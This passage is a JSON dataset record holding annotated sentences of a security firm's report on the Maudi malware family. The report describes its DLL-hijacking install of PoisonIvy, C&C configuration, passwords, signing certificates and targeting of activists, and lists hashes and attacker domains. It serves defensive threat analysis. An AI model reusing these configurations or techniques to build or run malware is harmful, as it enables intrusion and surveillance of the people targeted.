"P21", "h": 135, "t": 142, "evidence": [105]}, {"r": "P21", "h": 137, "t": 143, "evidence": [105]}, {"r": "P21", "h": 139, "t": 144, "evidence": [105, 106]}, {"r": "P21", "h": 145, "t": 146, "evidence": [110]}, {"r": "P21", "h": 147, "t": 148, "evidence": [110]}], "title": "201306NormanMaudi", "sents": [["NORMAN", "SHARK"], ["The", "Chinese", "Malware", "Complexes", ":", "The", "Maudi", "Surveillance", "Operation"], ["Snorre", "Fagerland", ",", "Principal", "Security", "Researcher", "1|The", "Chinese", "Malware", "Complexes", ":", "Maudi", "Norman", "Shark", "Introduction"], ["Maudi", "is", "a", "series", "of", "small", "malwares", "that", "share", "similar", "configuration", "and", "behaviour", "."], ["The", "naming", "of", "this", "family", "has", "not", "been", "very", "established", ",", "but", "some", "samples", "are", "detected", "by", "some", "vendors", "as", "Maudi", "or", "PoisonIvy", "."], ["This", "is", "partly", "accurate", "as", "Maudi", "trojans", "in", "almost", "all", "cases", "install", "the", "well", "known", "PoisonIvy", "remote", "access", "trojan", "."], ["These", "malwares", "are", "not", "particularly", "new", "-", "they", "have", "been", "in", "circulation", "for", "a", "long", "time", ",", "probably", "going", "back", "to", "at", "least", "2009", "."], ["Still", ",", "they", "provide", "a", "backdrop", "to", "other", "attacks", "that", "is", "interesting", "."], ["Behaviour"], ["The", "malware", "itself", "is", "not", "very", "complex", "."], ["These", "are", "small", "installers", "that", "create", "two", "files", "\u2013", "one", "library", "(", "typically", "called", "msacm32.drv", ",", "ntshrui.dll", "or", "wdmaud.drv", ")", "in", "the", "Windows", "folder", ",", "and", "a", "raw", "PoisonIvy", "shellcode", "blob", "called", "user.dat", ",", "user.db", ",", "temp.db", "or", "something", "along", "those", "lines", "."], ["The", "installer", "then", "spawns", "explorer.exe", ",", "which", "then", "automatically", "loads", "the", "malicious", "library", "through", "a", "mechanism", "called", "DLL", "hijacking", "aka", "DLL", "preloading", "(", "1", ")", "."], ["There", "are", "innocent", "libraries", "with", "the", "same", "names", "in", "the", "Windows", "System", "folder", ",", "but", "since", "the", "malicious", "libraries", "are", "placed", "in", "the", "Windows", "folder", ",", "they", "sneak", "in", "the", "queue", "and", "Explorer", "loads", "them", "first", "."], ["The", "malicious", "library", "then", "reads", "and", "directly", "calls", "the", "PoisonIvy", "code", "in", "user.dat", ",", "which", "establishes", "an", "encrypted", "communication", "with", "the", "configured", "C&C", "server", "."], ["When", "communication", "is", "established", ",", "the", "attacker", "has", "unauthorized", "access", "to", "the", "computer", "."], ["2|The", "Chinese", "Malware", "Complexes", ":", "Maudi", "Norman", "Shark", "Configuration", "PoisonIvy", "code", "blobs", "are", "preconfigured", "in", "the", "PoisonIvy", "builder", "program", "to", "contain", "information", "about", "which", "Command", "&", "Control", "server", "to", "contact", ",", "which", "port", "to", "establish", "connection", "on", ",", "and", "various", "other", "parameters", "."], ["The", "PoisonIvy", "builder", "The", "Maudi", "PoisonIvy", "droppers", "contain", "their", "own", "small", "xor", "-", "encoded", "configuration", "block", "which", "overrides", "the", "default", "settings", "stored", "in", "the", "PoisonIvy", "blob", "."], ["This", "usually", "contains", "the", "name", "of", "the", "C&C", "server", ",", "port", "and", "what", "corresponds", "to", "the"], ["PoisonIvy", "profile", "ID", "."], ["Example", "Maudi", "configuration", ":", "Profile", "ID", ":", "xfish"], ["C&C", ":", "171088046.gnway.org", "port", ":", "0x0D84", "=", "3460", "The", "ID", "xfish", "is", "used", "in", "many", "of", "these", "malwares", "and", "may", "be", "a", "default", "value", ",", "but", "there", "are", "many", "others", "in", "use", "."], ["3|The", "Chinese", "Malware", "Complexes", ":", "Maudi", "Norman", "Shark", "PoisonIvy", "uses", "the", "Camellia", "256", "-", "bit", "block", "cipher", "for", "its", "encrypted", "communication", "."], ["The", "password", "for", "this", "communication", "is", "usually", "hardcoded", "in", "the", "malware", "itself", ";", "the", "default", "value", "used", "by", "the", "builder", "is", "\u201c", "admin", "\u201d", "."], ["The", "passwords", "used", "by", "Maudi", "droppers", "vary", "."], ["Sometimes", "the", "default", "value", "is", "used", ",", "other", "times", "the", "password", "is", "set", "to", "longer", "strings", "."], ["There", "seems", "to", "be", "an", "affinity", "for", "passwords", "of", "length", "11", "(", "0x0b", ")", "."], ["A", "few", "are", "shown", "below", "."], ["20110105110", "12345678901", "beijing2011", "41232619820", "20110228001", "20110000000", "11111111111"], ["Some", "Maudi", "-", "PoisonIvy", "server", "passwords", "4|The", "Chinese", "Malware", "Complexes", ":", "Maudi", "Norman", "Shark", "Certificates"], ["The", "interesting", "bit", "with", "these", "trojans", "is", "that", "practically", "all", "of", "them", "are", "digitally", "signed", "using", "self", "-", "made", "test", "certficates", "."], ["These", "certificates", "vary", "somewhat", ",", "but", "most", "contain", "the", "recognizable", "string", "\u201c", "WWW.CeleWare", ".", "NET", "\u201d", "or", "\u201c", "WWW.AeleWare", ".", "NET", "\u201d", "in", "their", "Organizational", "Unit", "(", "OU", ")", "section", "."], ["The", "CeleWare", "strings", "are", "default", "values", "left", "by", "the", "free", "code", "signing", "tool", "CeleSign.exe", "from", "Yonsm", "."], ["NET", "."], ["Though", "the", "tool", "itself", "seems", "innocent", "enough", ",", "many", "files", "signed", "by", "it", "are", "malicious", "."], ["There", "were", "a", "number", "of", "different", "such", "certificates", ",", "and", "it", "may", "be", "that", "the", "varying", "certificates", "denote", "different", "campaigns", ",", "projects", "or", "other", "contexts", "\u2013", "for", "example", ",", "all", "samples", "we", "have", "seen", "signed", "\u201c", "DataBase@Hotmail.com", "\u201d", "are", "droppers", "that", "install", "Maudi", "components", "signed", "\u201c", "MogolSoft@Hotmail.com", "\u201d", "or", "\u201c", "SoftSign@HotMail.com", "\u201d", "."], ["5|The", "Chinese", "Malware", "Complexes", ":", "Maudi", "Norman", "Shark", "Stolen", "certificates"], ["Though", "by", "far", "most", "of", "these", "malwares", "use", "test", "certificates", ",", "not", "all", "follow", "this", "pattern", "."], ["A", "few", "are", "not", "signed", "at", "all", ",", "and", "in", "two", "cases", "we", "have", "seen", "the", "use", "of", "a", "stolen", "certificate", "."], ["The", "certificate", "in", "question", "belongs", "to", "YNK", "Japan", "Inc."], ["This", "is", "the", "configuration", "block", "from", "one", "of", "the", "YNK", "-", "signed", "Maudi", "samples", "."], ["C&C", "is", "p.hannmaill.net", ",", "port", "is", "3460", "(", "0xD84", ")", ",", "and", "tag", "is", "xfish", "."], ["These", "two", "trojans", "are", "configured", "to", "connect", "to", "p.hannmaill.net", "and", "s.hiinet.net", ",", "respectively", "."], ["These", "domains", "appear", "registered", "by", "the", "same", "entity", "(", "sofoxman@gmail.com", ")", "."], ["Both", "the", "domains", "and", "the", "certificate", "have", "been", "connected", "to", "targeted", "attack", "campaigns", "before", "."], ["6|The", "Chinese", "Malware", "Complexes", ":", "Maudi", "Norman", "Shark", "Infrastructure", "By", "combining", "certificates", "and", "command&control", "infrastructure", "we", "can", "construct", "a", "partial", "image", "of", "this", "malware", "operation", "Note", ":", "A", "high", "-", "resolution", "version", "of", "this", "graphic", "is", "appended", "to", "this", "report", "."], ["In", "this", "diagram", "the", "samples", "are", "organized", "in", "clusters", "signed", "similarly", "."], ["What", "quickly", "becomes", "obvious", "is", "that", "most", "of", "the", "samples", "are", "connected", ";", "either", "they", "use", "the", "same", "certificate", ",", "or", "their", "certificate", "cluster", "is", "connected", "with", "other", "clusters", "through", "common", "Command&Control", "servers", "."], ["Some", "clusters", "(", "shown", "at", "the", "lower", "right", "and", "left", "side", ")", "seem", "unconnected", "beyond", "the", "fact", "that", "they", "use", "the", "same", "malware", "."], ["The", "Command&Control", "servers", "used", "are", "in", "many", "cases", "organized", "through", "well", "-", "known", "dynamic", "DNS", "providers", "such", "as", "3322.org", ",", "zapto.org", "and", "so", "on", ",", "but", "there", "are", "also", "a", "few", "seemingly", "directly", "registered", "second", "level", "domains", "."], ["A", "full", "list", "of"], ["these", "is", "provided", "in", "the", "appendix", "."], ["7|The", "Chinese", "Malware", "Complexes", ":", "Maudi", "Norman", "Shark", "Targeting", "Local", "Chinese", "interests", "and", "human", "rights", "activists"], ["We", "do", "not", "have", "extensive", "data", "on", "which", "targets", "have", "been", "exposed", "to", "Maudi", "malware", ",", "but", "we", "have", "some", "examples", "which", "give", "decent", "hints", "."], ["Some", "Maudi", "droppers", "display", "images", ",", "like", "the", "ones", "below", ":", "This", "picture", "was", "widely", "distributed", "in", "2009", ",", "and", "allegedly", "showed", "results", "of", "violence", "during", "an", "Uighur", "riot", "."], ["However", ",", "it", "was", "later", "reported", "to", "be", "taken", "from", "a", "car", "accident", "."], ["This", "picture", "from", "Xinhuanet", "is", "reportedly", "from", "the", "2008", "riots", "in", "Lhasa", ",", "Tibet", "."], ["8|The", "Chinese", "Malware", "Complexes", ":", "Maudi", "Norman", "Shark"], ["These", "are", "classic", "examples", "of", "decoys", "used", "in", "targeted", "campaigns", "against", "activists", "working", "for", "the", "rights", "of", "ethnic", "minorities", "within", "the", "Chinese", "borders", "."], ["Other", "decoy", "documents", "contain", "small", "messages", "in", "Chinese", ";", "and", "Chinese", "name", "listings", "."], ["This", "gives", "the", "general", "impression", "that", "this", "family", "is", "used", "mostly", "against", "domestic", "Chinese", "targets", "and", "human", "rights", "activists", "."], ["Other", "research", "has", "confirmed", "this", "impression", "."], ["In", "his", "2010", "article", "\u201c", "Human", "Rights", "and", "Malware", "Attacks", "\u201d", "(", "2", ")", ",", "security", "researcher", "Nart", "Villeneuve", "documents", "the", "use", "of", "Maudi", "as", "the", "downloaded", "payload", "of", "spearphishing", "attacks", "."], ["The", "initial", "payload", "in", "that", "case", "was", "a", "mail", "attachment", ",", "an", "exploited", "PDF", "file", "(", "readme.pdf", ",", "md5", "72bdca7dd12ed04b21dfa60c5c2ab6c4", ")", "which", "downloaded", "and", "decoded", "an", "encoded", "blob", "(", "md5", "ec16143a14c091100e7af30de03fce1f", ")", "from", "the", "site", "www.humanright-watch.org", ",", "not", "to", "be", "confused", "with", "the", "legitimate", "Human", "Rights", "\u2019", "Watch", "website", "hrw.org", "."], ["The", "decoded", "file", "was", "a", "Maudi", "dropper", ",", "self", "-", "signed", "using", "the", "name", "\u201c", "soft@hotmail.com", "\u201d", ",", "and", "the", "dropped", "component", "belonged", "to", "the", "\u201c", "JinDiQIAO@hotmail.com\u201d-signed", "cluster", "."], ["Mongolia"], ["There", "are", "hints", "at", "other", "targets", "as", "well", "."], ["A", "group", "of", "Maudis", "use", "domain", "names", "and", "other", "strings", "that", "seem", "to", "indicate", "a", "focus", "on", "a", "specific", "region", ",", "namely", "Mongolia", "."], ["Mongolia", "is", "an", "interesting", "country", "."], ["It", "is", "democratic", "with", "a", "multi", "-", "party", "system", ",", "and", "has", "a", "market", "-", "driven", "economy", "."], ["It", "is", "squeezed", "between", "two", "very", "powerful", "nations", "\u2013", "Russia", "to", "the", "North", "and", "China", "to", "the", "South", "."], ["It", "is", "also", "a", "country", "rich", "on", "geological", "natural", "resources", "."], ["The", "initial", "hints", "about", "this", "targeting", "are", "vague", "."], ["Some", "of", "the", "Maudi", "samples", "are", "signed", "using", "self", "-", "signed", "certificate", "issued", "to", "\u201c", "mogolsoft@hotmail.com", "\u201d", "."], ["Others", "use", "the", "Command", "&", "Control", "domain", "\u201c", "mol-goverment.com", "\u201d", "."], ["This", "domain", "was", "registered", "by", "a", "known", "targeted", "attack", "actor", ",", "hlemonk@163.com", ",", "who", "has", "registered", "a", "string", "of", "other", "malwareconnected", "domains", "\u2013", "among", "others", "goodmongol.com", "."], ["However", ",", "when", "looking", "more", "closely", ",", "more", "solid", "ties", "to", "Mongolian", "targets", "can", "be", "found", "."], ["The", "Maudi", "domain", "bodologetee.com", "(", "registered", "by", "the", "email", "entity", "mongolianews@yahoo.com", ")", "can", "be", "documented", "used", "in", "other", "attacks", "on", "apparent", "Mongolian", "targets", "."], ["For", "example", ",", "the", "malware", "dropper", "cc1a806d25982acdb35dd196ab8171bc", ",", "a", "WinRAR", "SFX", "executable", "installed", "through", "the", "use", "of", "the", "Word", "exploit", "CVE-2012", "-", "0158", ",", "contained", "a", "PlugX", "component", "configured", "to", "connect", "to", "ppt.bodologetee.com", "."], ["This", "is", "documented", "in", "the", "Norman", "Shark", "blog", "post", "\u201c", "The", "Chinese", "Malware", "Complexes", ":", "PlugX", "Used", "against", "Mongolian", "Targets", "\u201d", "."], ["(", "3", ")", "9|The", "Chinese", "Malware", "Complexes", ":", "Maudi", "Norman", "Shark", "Connections", "to", "other", "attacks"], ["Indirectly", ",", "we", "see", "that", "the", "Maudi", "infrastructure", "shares", "parameters", "with", "several", "well", "known", "targeted", "attack", "campaigns", "."], ["o", "qwer.wekby.com", "-", "domain"], ["Three", "samples", "connect", "to", "qwer.wekby.com", ",", "known", "from", "the", "RSA", "breach", "in", "2011", "(", "4", ")", "."], ["These", "samples", "are", "(", "md5", ",", "profile", "ID", "):", "28b5241ca13603636dbf626792231161", ",", "qwerw", "6a83dc3f53079e17ecc49cbc0dacc8f5", ",", "qwerw", "cf45dbdb3718b4b728c2dd894032464b", ",", "qwerw", "The", "malwares", "used", "in", "the", "RSA", "intrusion", "itself", "were", "also", "PoisonIvy", ",", "though", "used", "a", "different", "dropper", "mechanism", "and", "were", "signed", "using", "a", "different", "digital", "certificate", "."], ["o", "jeno_1980@hotmail.com"], ["\u2013", "domain", "registration"], ["Two", "samples", "connect", "to", "ns2.adultstick.com", "."], ["This", "domain", "was", "registered", "by", "jeno_1980@hotmail.com", ",", "an", "email", "address", "also", "used", "to", "register", "domains", "used", "both", "in", "the", "Mirage", "(", "5", ")", "and", "Sin", "Digoo", "(", "6", ")", "malware", "campaigns", "."], ["7d36ad6aafbf1f9496ccc6ac1a8bb57e", ",", "Irqdz"], ["64718689ee3ff695c55ea1ec213434d1", ",", "Irqdz", "o", "enbtcd@yahoo.com.co", "\u2013", "domain", "registration"], ["Some", "Maudi", "samples", "connect", "to", "windows-liveupdate.com", "or", "windowsliveupdatecache.com", ",", "domains", "registered", "by", "the", "entity", "enbtcd@yahoo.com.co", "."], ["This", "address", "has", "also", "registered", "domains", "used", "in", "Briba", "(", "aka", "c0d0so0", ")", "malware", ",", "which", "has", "been", "used", "for", "many", "targeted", "attacks", "."], ["bd9a1fbd76c00015a59a3b5c93d4030e", ",", "c64aab79e5107fc8ffd4699288c2e3be", ",", "c9f33d544c5657d4ba55a92e06e38d06", ",", "49c7cae0fda8e5089e993a169c6c4197", ",", "914fdaf7aa098ac00067a2b265fc91da", ",", "zwdb", "gzzx"], ["Qbxt", "krgqy", "qq", "10", "|", "T", "h", "e", "C", "h", "i", "n", "e", "s", "e", "M", "a", "l", "w", "a", "r", "e", "C", "o", "m", "p", "l", "e", "x", "e", "s", ":", "M", "a", "u", "d", "i", "Norman", "Shark", "o", "hlemonk@163.com", "-", "domain", "registration"], ["This", "address", "was", "used", "to", "register", "the", "Maudi", "domains", "mol-government.com", "and", "newsyandex.com", ",", "used", "to", "host", "C&C", "for", "these", "samples", ":"], ["c93f8a7a899142db1e92138b76407588", "227636fb88e19eca33a02cbb46f279fb"], ["6e88c39c270e259c4472f6eceb8a241f", "865fec48937686c2d0708847f30b1264"], ["c07e857d2602d2a813fd23d711871571", "a25e5bcc52c386eb046149799ed81b2b", "3563c21cf5c46e8e39f17e733c2b9b1e", ",", "h511b0", "e78d39d1862338e4c711238223618e44", ",", "h511b0"], ["This", "registrant", "has", "also", "registered", "a", "great", "deal", "of", "other", "dodgy", "domains", "."], ["Mol-government.com", "and", "these", "other", "domains", "have", "been", "used", "as", "C&C", "by", "Sogu", "/", "Thoper", "trojans", "in", "attacks", "on", "apparent", "Korean", "and", "Mongolian", "targets", ",", "as", "well", "as", "by", "other", "malwares", "like", "PcClient", "."], ["o"], ["yt.bodologetee.com", "\u2013", "domain"], ["This", "domain", "has", "been", "used", "as", "Command", "&", "Control", "domain", "for", "a", "number", "of", "samples", "."], ["It", "has", "also", "been", "documented", "used", "by", "PlugX", "malware", "in", "campaigns", "apparently", "against", "Mongolian", "targets", "(", "3", ")", "."], ["The", "same", "registration", "information", "was", "used", "to", "register", "yahoomesseges.com", ",", "which", "has", "been", "used", "by", "EvilGrab", "(", "7", ")", "malware", "."], ["0cf15b88b18cdedfaae598e9498768e3", ",", "1e60824de00ce3c1f62fddc54a9c5c93", ",", "c64dd5393a17226b208b049a4b766bd6", ",", "646cfe960219f1948eac580e3bd836f8", ",", "ef404a76bd11e1d675b7686775ed7f1c", ",", "beijingnew", "jiagu", "jiagu", "text1"], ["nsc01", "o", "YNK", "JAPAN", "Inc", "\u2013", "digital", "certificate"], ["As", "previously", "mentioned", ",", "two", "samples", "were", "digitally", "signed", "using", "a", "certificate", "belonging", "to", "YNK", "JAPAN", "Inc.", ";", "a", "subsidiary", "of", "a", "Korean", "game", "producer", "."], ["This", "certificate", "has", "been", "used", "in", "several", "hundred", "samples", "spanning", "various", "campaigns", "and", "incidents", "."], ["One", "of", "these", "was", "the", "SK", "intrusion", "(", "8)", "in", "2011", ",", "where", "one", "of", "the", "initial", "malwares", "-", "a", "Sogu", "/", "Thoper", "trojan", "-", "was", "signed", "with", "it", "."], ["771a376df6aba0ce31e0c8e43cdf0800", ",", "xfish", "c3d14ee0bd01ebc9e5844578babe462f", ",", "xfish", "11", "|", "T", "h"], ["e", "C", "h", "i", "n", "e", "s", "e", "M", "a", "l", "w", "a", "r", "e", "C", "o", "m", "p", "l", "e", "x", "e", "s", ":", "M", "a", "u", "d", "i", "Norman", "Shark", "Conclusion"], ["The", "Maudi", "malware", "family", "seems", "to", "have", "been", "mostly", "used", "against", "Chinese", "/", "South", "-", "East", "Asian", "targets", "."], ["However", ",", "it", "shares", "some", "indicators", "(", "C&C", "domains", ",", "registration", "information", ")", "with", "other", ",", "more", "high", "-", "profile", "attacks", "."], ["What", "these", "connections", "mean", "is", "unclear", "."], ["It", "might", "be", "just", "sharing", "of", "information", "between", "groups", ";", "we", "know", "that", "there", "is", "quite", "a", "bit", "of", "sharing", "going", "on", ",", "particularly", "of", "malware", "and", "source", "code", "."], ["Less", "is", "known", "about", "how", "much", "is", "shared", "in", "terms", "of", "infrastructure", "(", "ex", ".", "domains", ")", "."], ["It", "is", "our", "opinion", ",", "however", ",", "that", "the", "Maudi", "system", "hints", "at", "something", "else", "."], ["There", "is", "for", "example", "a", "large", "amount", "of", "samples", "that", "use", "the", "same", "self", "-", "signed", "certificates", "in", "addition", "to", "overlaps", "in", "other", "indicators", "."], ["Self", "-", "signed", "certificates", "have", "little", "value", "in", "the", "underground", "as", "they", "can", "be", "freely", "made", ";", "so", "there", "is", "little", "reason", "for", "sharing", "these", "."], ["Instead", "the", "impression", "is", "that", "these", "malwares", "have", "been", "signed", "by", "the", "same", "malware", "creation", "system", "."], ["Another", "aspect", "is", "the", "architecture", "where", "default", "PoisonIvy", "shellcode", "blobs", "are", "overridden", "with", "configuration", "information", "from", "the", "dropper", "."], ["This", "also", "may", "indicate", "homegrown", "build", "tools", ",", "possibly", "to", "alleviate", "language", "issues", "with", "the", "PoisonIvy", "builder", "itself", "."], ["There", "is", "a", "possibility", "that", "this", "indicates", "a", "large", "group", "of", "attackers", ",", "but", "might", "also", "be", "a", "part", "of", "a", "Digital", "Quartermaster", "function", ",", "as", "recently", "postulated", "by", "FireEye", "(", "9", ")", "."], ["12", "|", "T", "h"], ["e"], ["C", "h", "i", "n", "e", "s", "e", "M", "a", "l", "w", "a", "r", "e", "C", "o", "m", "p", "l", "e", "x", "e", "s", ":", "M", "a", "u", "d", "i", "Norman", "Shark", "References", "1", "."], ["Windows", "Incident", "Response", "."], ["It", "'s", "those", "darned", "DLLs", "again", "...", "."], ["[", "Online", "]", "http://windowsir.blogspot.no/2010/08/itsthose-darned-dlls-again.html", "."], ["2", "."], ["Villeneuve", ",", "Nart", "."], ["Human", "Rights", "and", "Malware", "Attacks", "."], ["[", "Online", "]", "http://www.nartv.org/2010/07/29/human-rights-andmalware-attacks/.", "3", "."], ["Fagerland", ",", "Snorre", "."], ["PlugX", "used", "against", "Mongolian", "targets", "."], ["Norman", "Shark", "Blog", "."], ["[", "Online", "]", "http://normanshark.com/blog/plugx-used-mongolian-targets/.", "4", "."], ["Branco", ",", "Rodrigo", "."], ["Into", "the", "Darkness", ":", "Dissecting", "Targeted", "Attacks", "."], ["[", "Online", "]", "https://community.qualys.com/blogs/securitylabs/2011/11/30/dissecting-targeted-attacks", "."], ["5", "."], ["Cutler", ",", "Silas", "."], ["The", "Mirage", "Campaign", "."], ["[", "Online", "]", "http://www.secureworks.com/cyber-threat-intelligence/threats/themirage-campaign/.", "6", "."], ["Stewart", ",", "Joe", "."], ["The", "Sin", "Digoo", "Affair", "."], ["[", "Online", "]", "http://www.secureworks.com/cyber-threat-intelligence/threats/sindigoo/.", "7", "."], ["Trend", "Micro", ",", "Inc.", "2Q", "Report", "on", "Targeted", "Attack", "Campaigns", "."], ["[", "Online", "]", "http://about-threats.trendmicro.com/entprimers/#2q-report-on-targeted-attack-campaigns", "."], ["8", "."], ["Command", "Five", "Pty", "Ltd."], ["Command", "and", "Control", "in", "the", "Fifth", "Domain", "."], ["www.commandfive.com", "."], ["[", "Online", "]", "http://www.commandfive.com/papers/C5_APT_C2InTheFifthDomain.pdf", "."], ["9", "."], ["Moran", ",", "Ned", "and", "Bennett", ",", "James", "T.", "Supply", "Chain", "Analysis", ":", "From", "Quartermaster", "to", "Sunshop", "."], ["[", "Online", "]"], ["http://www.fireeye.com/resources/pdfs/fireeye-malware-supply-chain.pdf", "."], ["13", "|", "T", "h"], ["e", "C", "h", "i", "n", "e", "s", "e", "M", "a", "l", "w", "a", "r", "e", "C", "o", "m", "p", "l", "e", "x", "e", "s", ":", "M", "a", "u", "d", "i", "Norman", "Shark", "MD5"], ["14e04fcd7d769512b8a5e6e4905cd541", "68fbf9f48878ccd4d5addb255aea62d1", "bf50a4810e1bd9485822ec026fbcc176", "cc2397095e848f585970f1224bc24313", "d049654602597df24ca07c3bce885e8d", "09d07702e68abcfd6ab092e3c07624a6"], ["4390c478c960c09c7a1a745a2fc14059", "4b7f6d184952b6cd7a793b620d04f94d", "740828346fa3b403255fa50f24de0b33"], ["937f44857ab11320e3f73bbde559d019", "a48bd91396b98124cc278221f96fdf7c", "ccbb7928ae3b53464690d523860fbeb4"], ["da7e73ad2092ecf4aba68d7934df6d85", "01c1481a275c11f16979cad33975205a", "03287af69ef4828b1d1e6664eafe7cc1", "04f16f2729d7c3347deb747fb06c4e5a", "0c3963e90c6652b17f0f31c6821d41b0"], ["0f9d9caa21e3cf2dcdca14e3d7ccc337"], ["0fc9ed37c5cca5bfb726718c77cb7b0d", "106ae2f5128e9d54334b82f6e16ebd84"], ["1321e4bbcf0ec423d2fd4c556c7a10a9", "150aaf3de22afbb13a443be33123e411", "216011f19981aedf78346d5a7e59d318", "22e81ed5f4b3e8bb109a328c43e50b78", "24f1ccbc64587281be2ff87d3ef0c381", "28b5241ca13603636dbf626792231161", "2977209445d17781f793e7a684be9bb8"], ["2addee24fabdcb6f210140bc7e65502b", "2dca87e53573148ff4f8238f39004271", "31e4783c9bdfe17d8fb6976b79127c77", "343bea185561b5baad1da9b8a6c7e38e", "3783c0c404564fa2e7feef966ffa1d64", "38f82f67cdb48ec33a39deba4a6444b7", "3dcd1ea6a9943f99299bdeb6f38680de", "3fc1ec32376569389ea6db6463d474a3", "401e2a036d9d4956805d67117697193b", "4069a5690e64ffefbcae25ddef1f7017", "40de9d48dd7add3001da8a6e81e75850", "4159f6ec7da5ac9e79f4463c0994ce39", "433f123423136569a8fcc8bad96638d0", "44937bb4dd5320f4225c0ae74587f28e", "451a68f622493eb57f3450d3065a53e4", "46029bb9623bb37698354a9b80a3c63d"], ["463d308a7b1b3e2279cf5ae724cb887c", "46e14a7ad7dff5eb2b90c5ae1020df6f", "4a4dbfb626f3a04b152e5d702517f556", "4a8b86c8627b2a0da1a786a94c08a263", "4aa7f0c8980fe529594f52772693caca"], ["4bf956e04d08640bf51cd60f887c7274", "4c2df9200775d5e6f0cef469eb9f55a8", "4d45559794e2f9a3385f84fb43bc199e", "567eac46e43baa23d6f7f488e7cbc372"], ["57ee371849907f6215a9642da189c2e5", "6179bbfd346a0fa2a020dcee06efd91a"], ["627b3dcf0461b6ff388c0dac71074ee5", "C&C", "domain", "xboyu.dlinkddns.com", "xboyu.dlinkddns.com"], ["xboyu.dlinkddns.com", "wang981200.3322.org", "updatewin.3322.org", "127.0.0.1", "zeropan007.3322.org", "8852.vicp.cc", "qytianzheng.3322.org", "220.175.13.250", "127.0.0.1", "zeropan007.3322.org", "127.0.0.1", "asiondragon2008.3322.org", "yanfengjiaoxp.gicp.net", "mail.lufare.com", "bmw.webhop.net"], ["q944642367.gicp.net", "yanfengjiaoxp.gicp.net", "2yanfengjiaoxp.gicp.net", "news.lufare.com"], ["2yanfengjiaoxp.gicp.net", "services.servebbs.org", "cttwxsw.gicp.net", "sophia.8800.org", "qwer.wekby.com", "jiang2368131.3322.org", "black203.blogdns.com", "2yanfengjiaoxp.gicp.net", "127.0.0.1", "infasd.crabdance.com", "2yanfengjiaoxp.gicp.net", "yanfengjiaoxp.gicp.net", "222.134.42.62"], ["q944642367.gicp.net", "yanfengjiaoxp.gicp.net", "wang2368131.gicp.net", "mail.sufare.com", "surpriseing.homeftp.org", "117.40.239.20", "yanfengjiaoxp.gicp.net", "123.151.193.236", "df611.gicp.net", "zeropan007.3322.org"], ["360liveupdate.com", "df611.gicp.net", "mail.lufare.com", "2yanfengjiaoxp.gicp.net", "cttwxsw.gicp.net", "cttwxsw.gicp.net", "127.0.0.1", "360liveupdate.com", "dongtaiwang.vicp.net", "apple.buypn.com"], ["2yanfengjiaoxp.gicp.net", "14", "|", "T", "h", "e", "C", "h", "i", "n", "e", "s", "e", "M", "a", "l", "w", "a", "r", "e", "C", "o", "m", "p", "l", "e", "x", "e", "s", ":", "M", "a", "u", "d", "i", "Signed", "20120508", "20120508", "20120508", "20120508", "13@CeleWare", "."], ["NET"], ["360SE@hotmail.com"], ["360SE@hotmail.com", "360SE@hotmail.com", "360SE@hotmail.com", "360SE@hotmail.com", "360SE@hotmail.com", "360SE@hotmail.com", "360SE@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com", "JinDiQIAO@hotmail.com", "PoisonIvy", "Profile", "ID", "spy0611"], ["za_germany", "201205"], ["h511b0", "+", "xfish", "0912", "xfish", "xfish", "xfish", "xfish", "new", "xfish", "v1752", "xfish"], ["xz880", "xlsxx", "kor", "xfish", "yanf", "xnl80", "yanf"], ["IN", "xfish", "mayul", "qwerw", "dos", "lfish", "yanf", "xfish", "shego", "yanf", "xfish", "00001", "heilo", "xfish", "8888", "sjx80", "628", "xfisb", "xfish", "hack", "12345", "1.75", "526", "12345", "kelu6", "yanf", "xfish", "xfish", "xfish", "wzq", "xxxxx", "xxapp", "yanf", "Port", "8080"], ["8080", "8080", "3460", "8000", "3460", "80", "3461", "3460", "8080", "9090", "8080", "3460", "3460", "10012", "8080", "80", "6666", "10012", "10010", "80", "10010"], ["443", "80", "8080", "80", "6666", "3009", "10010", "3460", "80", "10010", "10012", "3460", "3460", "10012", "8888", "80", "443", "8081", "10012", "80", "3460", "8080", "3460", "3460", "25", "10010", "80", "80", "3460", "3460", "3460", "80", "10010", "Norman", "Shark", "64c28ef1701a21e631c2089284eb6da5"], ["65f9e138947d288c8e9426d820db6eea"], ["6848f8440227d06a308655f7638a6bee"], ["6a31e0f0a058e182aaebe512d12803d3"], ["6a4b549ca3689b71d26702335d95a842", "6a83dc3f53079e17ecc49cbc0dacc8f5"], ["6aa3ba5dd70a19745de9a8558648ef2d", "6af3587423d3afae735bebcd882d147a"], ["6e13a34dcfefa70ba341759c6636a951"], ["6e913d943a1e79af2990cc13d28344ac", "71ca1cae7ad22313ed14ad7e312b432f"], ["74a83fa5c9698019204432e99ce60fae", "75b8916a63ec1b4bb46ffeb755bc6641", "77d94d99bf89bd2421efd0d66ebcf25a"], ["798d926306e2e328f8147dc31b37d148"], ["7b13fd4d47c7e789a94bd304070af13a", "864fffd48523d9cbcd24917f7a54dc3d", "8651d46164a52da00188ad7760342b23", "86fa2e505cbbe4abf94b891caf46ec6e"], ["884323fc4c51e4ce4cc258fce243672a"], 